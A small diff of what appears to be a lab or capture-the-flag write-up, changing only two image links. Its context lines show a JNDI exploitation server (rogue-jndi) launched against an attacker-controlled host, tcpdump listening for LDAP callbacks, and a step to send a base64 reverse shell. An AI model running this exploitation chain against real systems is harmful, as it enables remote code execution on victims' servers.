@@ -81,13 +81,13 @@ git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mv
 java -jar RogueJndi-1.1.jar --command 'whoami' --hostname 10.10.16.34
 ```
 
-![](/img2/Pasted%20image%2020250319111412.png)
+![](/img2/Pasted%20image%2020250319161543.png)
 
 ```bash
 tcpdump -i tun0 port 389 -v
 ```
 
-![](/img2/Pasted%20image%2020250319161543.png)
+![](/img2/Pasted%20image%2020250319111549.png)
 
 - Send reverse shell in base64
 
